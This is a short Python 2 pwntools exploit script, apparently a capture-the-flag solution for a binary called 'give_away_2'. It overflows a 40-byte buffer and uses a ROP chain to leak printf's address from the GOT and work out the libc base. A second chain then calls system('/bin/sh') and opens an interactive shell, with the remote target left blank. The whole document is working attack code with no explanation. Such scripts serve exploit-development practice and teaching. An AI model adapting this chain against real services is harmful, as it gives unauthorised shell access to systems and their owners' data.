from pwn import *

debug = True

payload = "A"*40 

if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./give_away_2')
    elf = ELF('./give_away_2')
else:
    libc = ELF('libc-2.27.so')
    p = remote('', 0)

a = p.recvline()
print a
main_address = int(a.split()[2],16)
elf.address = main_address-elf.sym['main']
print 'elf base address: ', hex(elf.address)
pop_rdi_ret = elf.address+0x0000000000000903
ret = elf.address+0x0000000000000676
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(elf.got['printf'])
payload += p64(elf.plt['printf'])
payload += p64(elf.sym['vuln'])

p.sendline(payload)
leak = p.recv().ljust(8, '\x00')
print 'printf leak: ', hex(u64(leak))
libc.address = u64(leak)-libc.sym['printf']
print 'libc base address: ', hex(libc.address)
print '/bin/sh address: ', hex(libc.search('/bin/sh').next())
print 'system address: ', hex(libc.sym['system'])
print 'system address: ', hex(libc.sym['exit'])
payload = "A"*40
payload += p64(pop_rdi_ret)
payload += p64(libc.search('/bin/sh').next())
payload += p64(libc.sym['system'])
payload += p64(libc.sym['exit'])
p.sendline(payload)
p.interactive()
